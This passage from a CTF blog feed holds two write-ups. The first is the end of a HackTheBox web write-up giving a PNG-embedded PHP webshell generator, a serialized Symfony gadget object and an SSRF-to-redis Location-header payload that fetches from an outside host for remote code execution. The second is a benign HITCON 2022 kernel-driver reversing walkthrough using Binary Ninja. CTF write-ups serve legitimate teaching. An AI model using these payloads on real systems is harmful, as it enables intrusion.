class="number">0x20</span>, <span class="number">0xD8</span>, <span class="number">0xD9</span>, <span class="number">0x3C</span>, <span class="number">0x67</span>, <span class="number">0xF4</span>, <span class="number">0x50</span>, <span class="number">0x67</span>, <span class="number">0xF4</span>, <span class="number">0x50</span>, <span class="number">0xA3</span>, <span class="number">0x9F</span>, <span class="number">0x67</span>, <span class="number">0xA5</span>, <span class="number">0xBE</span>, <span class="number">0x5F</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5A</span>, <span class="number">0x4C</span>, <span class="number">0xA1</span>, <span class="number">0x3F</span>, <span class="number">0x7A</span>, <span class="number">0xBF</span>, <span class="number">0x30</span>, <span class="number">0x6B</span>, <span class="number">0x88</span>, <span class="number">0x2D</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x52</span>, <span class="number">0x9D</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x94</span>, <span class="number">0xA1</span>, <span class="number">0x27</span>, <span class="number">0x56</span>, <span class="number">0xEC</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>, <span class="number">0x20</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x58</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, <span class="number">0x55</span>, <span class="number">0xCF</span>, <span class="number">0x09</span>, <span class="number">0x5C</span>, <span class="number">0x10</span>, <span class="number">0x40</span>, <span class="number">0x8A</span>, <span class="number">0xB9</span>, <span class="number">0x39</span>, <span class="number">0xB3</span>, <span class="number">0xC8</span>, <span class="number">0xCD</span>, <span class="number">0x64</span>, <span class="number">0x45</span>, <span class="number">0x3C</span>, <span class="number">0x49</span>, <span class="number">0x3E</span>, <span class="number">0xAD</span>, <span class="number">0x3F</span>, <span class="number">0x33</span>, <span class="number">0x56</span>, <span class="number">0x1F</span>, <span class="number">0x19</span> );</span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">110</span>, <span class="number">110</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line"><span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>)*<span class="number">2</span>, <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>)*<span class="number">2</span>+<span class="number">1</span>, <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>)*<span class="number">2</span>, <span class="number">1</span>, <span class="variable">$color</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>)*<span class="number">2</span>+<span class="number">1</span>, <span class="number">1</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>So we create our payload with: <code>php gen.php &#39;&lt;?php phpinfo(); ?&gt;&#39; blank.png</code></p><p>We are going to modify the code of the application so that the variables <code>$map</code> and <code>$stamp</code> point towards this malicious file, moreover, we also modify the variable <code>$this-&gt;export_file</code> so that it is equal to <code>exploit.php</code>. So we recreate a point on the map, and after a minute (we wait for the <code>worker.sh</code> script to be executed), we go to <code>/static/exports/exploit.php</code>, and … :</p><p><img src="/images/13.png" alt="phpinfo"></p><p>So we succeeded in getting our remote code execution, so we will modify the payload to be as follows:</p><p><code>php test.php &#39;&lt;?=</code>$_GET[1]<code>?&gt;&#39; blank.png</code></p><p>Once done, we restart the application, we recreate a point, we go to <code>/static/exports/exploit.php</code> and … :</p><p><img src="/images/14.png" alt="flag_local"></p><p>We arrive at flag locally ! It is now necessary to recover the serialized payload in redis, and to try to insert it directly via the XADD command. We recover our payload which is in the form :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XADD messages * message &quot;s:1053:\&quot;&#123;\&quot;body\&quot;:\&quot;O:36:\\\\\\\&quot;Symfony\\\\\\\\Component\\\\\\\\Messenger\\\\\\\\Envelope\\\\\\\&quot;:2:&#123;s:44:\\\\\\\&quot;\\\\0Symfony\\\\\\\\Component\\\\\\\\Messenger\\\\\\\\Envelope\\\\0stamps\\\\\\\&quot;;a:1:&#123;s:46:\\\\\\\&quot;Symfony\\\\\\\\Component\\\\\\\\Messenger\\\\\\\\Stamp\\\\\\\\BusNameStamp\\\\\\\&quot;;a:1:&#123;i:0;O:46:\\\\\\\&quot;Symfony\\\\\\\\Component\\\\\\\\Messenger\\\\\\\\Stamp\\\\\\\\BusNameStamp\\\\\\\&quot;:1:&#123;s:55:\\\\\\\&quot;\\\\0Symfony\\\\\\\\Component\\\\\\\\Messenger\\\\\\\\Stamp\\\\\\\\BusNameStamp\\\\0busName\\\\\\\&quot;;s:21:\\\\\\\&quot;messenger.bus.default\\\\\\\&quot;;&#125;&#125;&#125;s:45:\\\\\\\&quot;\\\\0Symfony\\\\\\\\Component\\\\\\\\Messenger\\\\\\\\Envelope\\\\0message\\\\\\\&quot;;O:33:\\\\\\\&quot;App\\\\\\\\Message\\\\\\\\SubscribeNotification\\\\\\\&quot;:4:&#123;s:5:\\\\\\\&quot;email\\\\\\\&quot;;s:6:\\\\\\\&quot;a@a.fr\\\\\\\&quot;;s:4:\\\\\\\&quot;uuid\\\\\\\&quot;;O:47:\\\\\\\&quot;App\\\\\\\\MessageHandler\\\\\\\\SubscribeNotificationHandler\\\\\\\&quot;:7:&#123;s:5:\\\\\\\&quot;email\\\\\\\&quot;;N;s:4:\\\\\\\&quot;uuid\\\\\\\&quot;;N;s:11:\\\\\\\&quot;export_file\\\\\\\&quot;;s:11:\\\\\\\&quot;exploit.php\\\\\\\&quot;;s:12:\\\\\\\&quot;x_coordinate\\\\\\\&quot;;N;s:12:\\\\\\\&quot;y_coordinate\\\\\\\&quot;;N;s:3:\\\\\\\&quot;map\\\\\\\&quot;;s:30:\\\\\\\&quot;http:\\/\\/146.59.156.82\\/blank.png\\\\\\\&quot;;s:5:\\\\\\\&quot;stamp\\\\\\\&quot;;s:30:\\\\\\\&quot;http:\\/\\/146.59.156.82\\/blank.png\\\\\\\&quot;;&#125;s:12:\\\\\\\&quot;x_coordinate\\\\\\\&quot;;s:3:\\\\\\\&quot;420\\\\\\\&quot;;s:12:\\\\\\\&quot;y_coordinate\\\\\\\&quot;;s:3:\\\\\\\&quot;226\\\\\\\&quot;;&#125;&#125;\&quot;,\&quot;headers\&quot;:[]&#125;\&quot;;&quot;</span><br></pre></td></tr></table></figure><p>We go to <code>/static/export/exploit.php</code> :</p><p><img src="/images/15.png" alt="flag_local_read"></p><p>So we have our functional payload ! We just have to spawn an instance on the hackthebox website, and to put our payload in the header “Location”, for that, I listen directly with netcat to avoid having to play with the quotes.</p><p>So we send the following payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302</span><br><span class="line">Location: http://unix:/var/run/redis/redis.sock:&quot;redis.call(&#x27;XADD&#x27;,&#x27;messages&#x27;,&#x27;*&#x27;,&#x27;message&#x27;,&#x27;s:1053:\&quot;&#123;\&quot;body\&quot;:\&quot;O:36:\\\\\\\\\\\\\&quot;Symfony\\\\\\\\\\\\\\\\Component\\\\\\\\\\\\\\\\Messenger\\\\\\\\\\\\\\\\Envelope\\\\\\\\\\\\\&quot;:2:&#123;s:44:\\\\\\\\\\\\\&quot;\\\\\\\\0Symfony\\\\\\\\\\\\\\\\Component\\\\\\\\\\\\\\\\Messenger\\\\\\\\\\\\\\\\Envelope\\\\\\\\0stamps\\\\\\\\\\\\\&quot;;a:1:&#123;s:46:\\\\\\\\\\\\\&quot;Symfony\\\\\\\\\\\\\\\\Component\\\\\\\\\\\\\\\\Messenger\\\\\\\\\\\\\\\\Stamp\\\\\\\\\\\\\\\\BusNameStamp\\\\\\\\\\\\\&quot;;a:1:&#123;i:0;O:46:\\\\\\\\\\\\\&quot;Symfony\\\\\\\\\\\\\\\\Component\\\\\\\\\\\\\\\\Messenger\\\\\\\\\\\\\\\\Stamp\\\\\\\\\\\\\\\\BusNameStamp\\\\\\\\\\\\\&quot;:1:&#123;s:55:\\\\\\\\\\\\\&quot;\\\\\\\\0Symfony\\\\\\\\\\\\\\\\Component\\\\\\\\\\\\\\\\Messenger\\\\\\\\\\\\\\\\Stamp\\\\\\\\\\\\\\\\BusNameStamp\\\\\\\\0busName\\\\\\\\\\\\\&quot;;s:21:\\\\\\\\\\\\\&quot;messenger.bus.default\\\\\\\\\\\\\&quot;;&#125;&#125;&#125;s:45:\\\\\\\\\\\\\&quot;\\\\\\\\0Symfony\\\\\\\\\\\\\\\\Component\\\\\\\\\\\\\\\\Messenger\\\\\\\\\\\\\\\\Envelope\\\\\\\\0message\\\\\\\\\\\\\&quot;;O:33:\\\\\\\\\\\\\&quot;App\\\\\\\\\\\\\\\\Message\\\\\\\\\\\\\\\\SubscribeNotification\\\\\\\\\\\\\&quot;:4:&#123;s:5:\\\\\\\\\\\\\&quot;email\\\\\\\\\\\\\&quot;;s:6:\\\\\\\\\\\\\&quot;a@a.fr\\\\\\\\\\\\\&quot;;s:4:\\\\\\\\\\\\\&quot;uuid\\\\\\\\\\\\\&quot;;O:47:\\\\\\\\\\\\\&quot;App\\\\\\\\\\\\\\\\MessageHandler\\\\\\\\\\\\\\\\SubscribeNotificationHandler\\\\\\\\\\\\\&quot;:7:&#123;s:5:\\\\\\\\\\\\\&quot;email\\\\\\\\\\\\\&quot;;N;s:4:\\\\\\\\\\\\\&quot;uuid\\\\\\\\\\\\\&quot;;N;s:11:\\\\\\\\\\\\\&quot;export_file\\\\\\\\\\\\\&quot;;s:11:\\\\\\\\\\\\\&quot;exploit.php\\\\\\\\\\\\\&quot;;s:12:\\\\\\\\\\\\\&quot;x_coordinate\\\\\\\\\\\\\&quot;;N;s:12:\\\\\\\\\\\\\&quot;y_coordinate\\\\\\\\\\\\\&quot;;N;s:3:\\\\\\\\\\\\\&quot;map\\\\\\\\\\\\\&quot;;s:30:\\\\\\\\\\\\\&quot;http:\\\\/\\\\/146.59.156.82\\\\/blank.png\\\\\\\\\\\\\&quot;;s:5:\\\\\\\\\\\\\&quot;stamp\\\\\\\\\\\\\&quot;;s:30:\\\\\\\\\\\\\&quot;http:\\\\/\\\\/146.59.156.82\\\\/blank.png\\\\\\\\\\\\\&quot;;&#125;s:12:\\\\\\\\\\\\\&quot;x_coordinate\\\\\\\\\\\\\&quot;;s:3:\\\\\\\\\\\\\&quot;420\\\\\\\\\\\\\&quot;;s:12:\\\\\\\\\\\\\&quot;y_coordinate\\\\\\\\\\\\\&quot;;s:3:\\\\\\\\\\\\\&quot;226\\\\\\\\\\\\\&quot;;&#125;&#125;\&quot;,\&quot;headers\&quot;:[]&#125;\&quot;;&#x27;); return ARGV[1];&quot; 0</span><br></pre></td></tr></table></figure><p>We thus obtain the flag : <code>HTB&#123;7r1p_t0_Da_r3d1sl4nD_pr0xy_p455_y0u_1n!&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> htb </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> redis </tag>
            
            <tag> nginx </tag>
            
            <tag> rce </tag>
            
            <tag> ssrf </tag>
            
            <tag> Worty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HITCON2022 - Checker] How to reverse a metamorphic windows kernel driver statically - 0poss</title>
      <link href="/2022/11/29/checker/"/>
      <url>/2022/11/29/checker/</url>
      
        <content type="html"><![CDATA[<p>This is a long write-up. It’s not particularly technical, I just wanted to show how I reverse-engineering this challenge fully statically using Binary Ninja.</p><p><img src="/hitcon2022/Untitled.png" alt="Untitled"></p><p>The archive contains two files, <code>check_drv.sys</code> and <code>checker.exe</code>, so we can already guess that the <code>.exe</code> is a user-mode application making requests (spoil : <a href="https://gprivate.com/621hb">IRPs</a>) to the <code>.sys</code> kernel driver for flag verification.</p><p>Since we can make the (educated) guess that most of the code is inside the driver, let’s take a quick look inside <code>checker.exe</code>. Quick tip if you’re looking for the call to the <code>main</code> function inside the <code>_start</code> in a Portable Executable :</p><span id="more"></span><p><img src="/hitcon2022/Untitled%201.png" alt="Untitled"></p><p>It’s here.</p><p>Single click on <code>sub_140001070</code> and press <code>y</code>. Change the <code>int64_t sub_140001070()</code> into <code>int32_t main(int32_t argc, char** argv)</code> (it will both change the type and rename it). After a little renaming, we get the following function :</p><p><img src="/hitcon2022/Untitled%202.png" alt="Untitled"></p><p>It seems that <code>checker.exe</code> sends a <code>0x222080</code> control code to the <code>hitcon_checker</code> device… and that’s it. It doesn’t take input and doesn’t send any buffer to the device. It only prints “wrong” if the driver returns <code>0</code> in the input buffer, “correct” otherwise. So I guess we’ll have to check the driver itself and see what it’s all about.</p><p>Open the <code>checker.sys</code> in your favorite disassembler. In case you’re wondering where the call to <code>DriverEntry</code> is :</p><p><img src="/hitcon2022/Untitled%203.png" alt="Untitled"></p><p>It’s here.</p><p>And it’s ugly.</p><p><img src="/hitcon2022/Untitled%204.png" alt="Untitled"></p><p>There’s a bunch of additional XORs that we’ll get onto much later but first let us make more sens out of the variables of the function.</p><p>Before re-typing and re-naming <code>uint64_t sub_140001b50(void* arg1)</code>  to <code>NTSTATUS DriverEntry(DRIVER_OBJECT* DriverObject, UNICODE_STRING *RegistryPath)</code>, we need to actually define these types. Easy stuff with Binary Ninja, just download the Windows kernel headers (for example from ‣), click “Types” in the left sidebar, click anywhere in the types panel and press <code>i</code> before writing the following :</p><p><img src="/hitcon2022/Untitled%205.png" alt="Untitled"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wdm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> DEVICE_OBJECT lol1;</span><br><span class="line"><span class="keyword">typedef</span> DRIVER_OBJECT lol2;</span><br><span class="line"><span class="keyword">typedef</span> IRP lol3;</span><br><span class="line"><span class="keyword">typedef</span> UNICODE_STRING lol4;</span><br><span class="line"><span class="keyword">typedef</span> OB_CALLBACK_REGISTRATION lol5;</span><br><span class="line"><span class="keyword">typedef</span> OB_OPERATION_REGISTRATION lol6;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-isystem /home/osef/Documents/winsdk<span class="number">-10</span>/Include/<span class="number">10.0</span><span class="number">.16299</span><span class="number">.0</span>/km -isystem /home/osef/Documents/winsdk<span class="number">-10</span>/Include/<span class="number">10.0</span><span class="number">.16299</span><span class="number">.0</span>/km/crt -isystem /home/osef/Documents/winsdk<span class="number">-10</span>/Include/<span class="number">10.0</span><span class="number">.16299</span><span class="number">.0</span>/shared -D_AMD64_</span><br></pre></td></tr></table></figure><p>Remember to change the path to the headers at the bottom. If you’re using Linux, you’ll need to manually create two or three symlinks inside the header directories because of inconsistent letter cases in some includes. Binary Ninja will recursively define the requested types. I don’t know how to tell it to import ALL types from <code>wdm.h</code>, hence the dummy typedefs.</p><p>NOW we can rename <code>uint64_t sub_140001b50(void* arg1)</code>  to <code>NTSTATUS DriverEntry(DRIVER_OBJECT* DriverObject, UNICODE_STRING *RegistryPath)</code>, and the function makes slightly more sens :</p><p><img src="/hitcon2022/Untitled%206.png" alt="Untitled"></p><p>Using the <code>y</code> keybinding, we can directly change <code>sub_140001000</code>‘s name and type to <code>void DriverUnload(DRIVER_OBJECT *DriverObject)</code>.</p><p>Taking a look at <code>sub_140001110</code> :</p><p><img src="/hitcon2022/Untitled%207.png" alt="Untitled"></p><p>That the function creating the <code>hitcon_checker</code> device (with a comfy symlink to it). Using the <code>y</code> keybinding, do the following changes :</p><table><thead><tr><th>int64_t sub_140001110(void* arg1)</th><th>NTSTATUS CreateHitconDevice(DRIVER_OBJECT* DriverObject)</th></tr></thead><tbody><tr><td>data_140003158</td><td>UNICODE_STRING us_device_symlink</td></tr><tr><td>data_140003148</td><td>UNICODE_STRING us_device_name</td></tr><tr><td>data_140003140</td><td>DEVICE_OBJECT *HitconDevice</td></tr></tbody></table><p>Here’s the result :</p><p><img src="/hitcon2022/Untitled%208.png" alt="Untitled"></p><p>Inside <code>sub_140001040</code></p><p><img src="/hitcon2022/Untitled%209.png" alt="Untitled"></p><p>We have a lot of “unused” stack variables, so these probably are a structure that is mistyped. Either way, there’s a call to <code>[ObRegisterCallbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks)</code> so that’s confirmed. One variable, <code>var_60</code>, is assigned <code>PsProcessType</code>, meaning that the driver is registering a callback to handle operations on processes. Let’s change <code>var_40</code>‘s type to <code>[OB_CALLBACK_REGISTRATION](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_ob_callback_registration)</code> and it’s name to <code>ObCallbackRegistration</code>. The function is now slightly more readable :</p><p><img src="/hitcon2022/Untitled%2010.png" alt="Untitled"></p><p>But we still have some “unused” stack variables so let’s do the following changes :</p><table><thead><tr><th>int64_t (* const var_60)()</th><th>OB_OPERATION_REGISTRATION ObOperationRegistration</th></tr></thead><tbody><tr><td>int128_t var_18</td><td>UNICODE_STRING us_altitude</td></tr><tr><td>int128_t zmm0</td><td>UNICODE_STRING us_altitude2</td></tr><tr><td>int64_t var_88</td><td>int64_t Context[0x5] (the RegistrationContext is driver-dependent, this is just a guess)</td></tr><tr><td>int64_t rax</td><td>NTSTATUS ret</td></tr><tr><td>data_140003168</td><td>PVOID RegistrationHandle</td></tr><tr><td>int64_t sub_140001430(int64_t, int32_t*)</td><td>OB_PREOP_CALLBACK_STATUS PreProcCallback(PVOID, POB_PRE_OPERATION_INFORMATION PreOpInformation)</td></tr><tr><td>NTSTATUS sub_140001040()</td><td>NTSTATUS RegisterCallback()</td></tr></tbody></table><p>And the function is now much more readable :</p><p><img src="/hitcon2022/Untitled%2011.png" alt="Untitled"></p><p>Of course all of this wasn’t needed ; but still, it’s good practice.</p><p>Let’s get into the <code>PreProcCallback</code> function. To make it a little easier to read, we can override Windows’s <code>typedef ULONG OB_OPERATION</code> with the following type :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">OB_OPERATION</span> &#123;</span></span><br><span class="line">OB_OPERATION_HANDLE_CREATE = <span class="number">1</span>,</span><br><span class="line">OB_OPERATION_HANDLE_DUPLICATE = <span class="number">2</span></span><br><span class="line">&#125; OB_OPERATION;</span><br></pre></td></tr></table></figure><p>Change <code>int32_t rax_2</code> and <code>int32_t* rcx_2</code> to <code>OB_OPERATION op</code> and <code>OB_PRE_CREATE_HANDLE_INFORMATION* params</code>, respectively, to get :</p><p><img src="/hitcon2022/Untitled%2012.png" alt="Untitled"></p><p>By looking into <code>data_140003170</code>, we that it’s a <code>0x10000</code> (<code>65536</code>)-long <code>uint8_t</code> array. Since the PIDs on Windows range from <code>0</code> to <code>65535</code>, we can be pretty confident when re-typing and renaming <code>data_140003170</code> to <code>uint8_t PIDArray[0x10000]</code>. So this little function checks if the process that triggered the callback has an entry in <code>PIDArray</code> that is not <code>0</code> and declines further handle creation and duplication iff the original requested access rights has the lowest bit set to <code>1</code>. To this day, I don’t know what the purpose of this function is (probably just preventing processes that already opened a handle to the device to create other handles to it, but I don’t get what this achieves). If you know more about this, please tell me.</p><p>After inserting a few comments, the <code>DriverEntry</code> is now a little bit cleaner (I used High Level IL to hide the boring casts) :</p><p><img src="/hitcon2022/Untitled%2013.png" alt="Untitled"></p><p>There’s still some stuff to resolve.</p><p>Let’s take a look inside the <code>sub_1400011b0</code>, the function that is supposed to handle those IRPs.</p><p><img src="/hitcon2022/Untitled%2014.png" alt="Untitled"></p><p>It really isn’t big and there’s a cute little switch with 9 cases. Before looking at the code, let’s change it’s type and name to <code>NTSTATUS DispatchXXX(DEVICE_OBJECT* DeviceObject, IRP* Irp)</code> (how do I know ? <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object">Because I do</a>).</p><p><img src="/hitcon2022/Untitled%2015.png" alt="Untitled"></p><p>Inside the function, Binary Ninja incorrectly identifies (I’m <em>pretty</em> sure) the function at <code>0x140001ed0</code> as being the <code>Concurrency::details::VirtualProcessor::GetExecutingContext</code> function from the <a href="https://learn.microsoft.com/en-us/cpp/parallel/concrt/concurrency-runtime?view=msvc-170">C++ concurrency runtime</a>. If we look at it’s content, it only loads the <code>qword</code> at offset <code>0xb8</code> from the input pointer. At offset <code>0xb8</code> of the <code>IRP</code> structure resides a <code>union</code> with a <code>struct _IO_STACK_LOCATION* CurrentStackLocation</code> and a <code>ULONG PacketType</code>. Since it loads a <code>qword</code>, and that this <code>qword</code> is later used as a pointer for dereferencing several values, we can guess that the <code>union</code> will consist of the <code>CurrentStackLocation</code> field at runtime. So <code>Concurrency::details::VirtualProcessor::GetExecutingContext</code> is in fact <code>[IoGetCurrentIrpStackLocation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation)</code>. Let’s fix this.</p><p>Let’s also fix the <code>PsGetCurrentProcessId</code> (because I forgot to do it when going over <code>PreProcCallback</code>) so that it doesn’t take any argument (<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psgetcurrentprocessid">because it doesn’t</a>).</p><p>To speed up a little, here’s what we have :</p><p><img src="/hitcon2022/Untitled%2016.png" alt="Untitled"></p><p>and the end of the function is :</p><p><img src="/hitcon2022/Untitled%2017.png" alt="Untitled"></p><p>In a nutshell, if after all the cases have been executed, the <code>flag</code> global array starts with “hitcon”, we win (remember the end of the <code>main</code> function in the user mode application ?).</p><p>Before jumping into the <code>myterious_bunch_of_xors</code> function, we need to finish unraveling the <code>DriverEntry</code>.</p><p>Remember :</p><p><img src="/hitcon2022/Untitled%2018.png" alt="Untitled"></p><p>Calling <code>MmGetPhysicalAddress</code> with a virtual address as argument (e.g. the address of <code>flag</code>) returns the physical address that it maps to. <code>MmMapIoSpace</code> does the “contrary” ; it takes a physical address range as input, create a new virtual mapping to the physical address range. This means that after the call to <code>MmMapIoSpace</code>, there will be at least two virtual pages that are mapped to the same physical memory region.</p><p>In this case, the driver maps <code>0x1000</code> (<code>4096</code>) bytes of new virtual memory to the same physical region that <code>flag</code> was mapped onto. It then stores the first address of this new mapping inside <code>data_140013170</code>, and does the same thing for the <code>PreProcCallback</code> function and <code>data_140013188</code>.</p><p><code>data_140013178</code> also maps onto the same physical memory region as <code>flag + 0x30</code> and <code>data_140013180</code> onto the same physical memory region as <code>PreProcCallback + 0x700</code>, namely <code>sub_140001b30</code> :</p><p><img src="/hitcon2022/Untitled%2019.png" alt="Untitled"></p><p>Very simple function. We’ll call it <code>dec</code> as in “decryption” !</p><p>Since we know that <code>data_140013170</code> always points to <code>flag</code>, let’s patch the binary, And do the same for <code>data_140013178</code>, <code>data_140013188</code> and <code>data_140013180</code>, shall we ?</p><p>If you look at all the code refs to <code>data_140013170</code>, these are all (except for the first one) <code>mov rbx, qword [rel data_140013170]</code>, so they just load the address of <code>flag</code> into <code>rbx</code>. We’re going to replace them by an <code>lea rbx, qword [rel flag]</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /!\ Very important when messing around with the Binary Ninja API /!\</span></span><br><span class="line">bv.begin_undo_actions()</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x140003000</span></span><br><span class="line"><span class="comment"># Get all code refs to `data_140013170`.</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> bv.get_data_var_at(<span class="number">0x140013170</span>).code_refs:</span><br><span class="line">    inst = r.llil</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make sure we patching the right instructions</span></span><br><span class="line">    <span class="keyword">if</span> inst.operation == LowLevelILOperation.LLIL_SET_REG <span class="keyword">and</span> inst.dest.name == <span class="string">&#x27;rbx&#x27;</span>:</span><br><span class="line">        delta = flag_addr - inst.address</span><br><span class="line"></span><br><span class="line">        <span class="comment"># `lea rbx, qword [rel flag]` is 7 bytes long.</span></span><br><span class="line">        asm = <span class="string">f&quot;lea rbx, [rip+<span class="subst">&#123;delta - <span class="number">7</span>:#x&#125;</span>]&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Patching&quot;</span>, <span class="built_in">hex</span>(inst.address), <span class="built_in">str</span>(inst), <span class="string">&quot;with&quot;</span>, asm)</span><br><span class="line">        asm = bv.arch.assemble(asm)</span><br><span class="line">        bv.write(inst.address, asm)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /!\ Very important when messing around with the Binary Ninja API /!\</span></span><br><span class="line">bv.commit_undo_actions()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done&quot;</span>)</span><br></pre></td></tr></table></figure><p>Let’s turn this into a function to apply this to the other virtual address duplicate :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># /!\ Very important when messing around with the Binary Ninja API /!\</span></span><br><span class="line">bv.begin_undo_actions()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_vaddr_instructions</span>(<span class="params">original_addr, vaddr_ptr</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> bv.get_data_var_at(vaddr_ptr).code_refs:</span><br><span class="line">        inst = r.llil</span><br><span class="line">        <span class="keyword">if</span> inst.operation == LowLevelILOperation.LLIL_SET_REG:</span><br><span class="line">            delta = original_addr - inst.address</span><br><span class="line"></span><br><span class="line">            <span class="comment"># `lea reg, qword [rel pos]` is 7 bytes long.</span></span><br><span class="line">            asm = <span class="string">f&quot;lea <span class="subst">&#123;inst.dest.name&#125;</span>, [rip+<span class="subst">&#123;delta - <span class="number">7</span>:#x&#125;</span>]&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Patching&quot;</span>, <span class="built_in">hex</span>(inst.address), <span class="built_in">str</span>(inst), <span class="string">&quot;with&quot;</span>, asm)</span><br><span class="line">            asm = bv.arch.assemble(asm)</span><br><span class="line">            bv.write(inst.address, asm)</span><br><span class="line"></span><br><span class="line">flag_addr = bv.get_symbol_by_raw_name(<span class="string">&quot;flag&quot;</span>).address</span><br><span class="line">patch_vaddr_instructions(flag_addr, <span class="number">0x140013170</span>)</span><br><span class="line">patch_vaddr_instructions(flag_addr + <span class="number">0x30</span>, <span class="number">0x140013178</span>)</span><br><span class="line"></span><br><span class="line">proccbk_addr = bv.get_symbol_by_raw_name(<span class="string">&quot;PreProcCallback&quot;</span>).address</span><br><span class="line">patch_vaddr_instructions(proccbk_addr + <span class="number">0x700</span>, <span 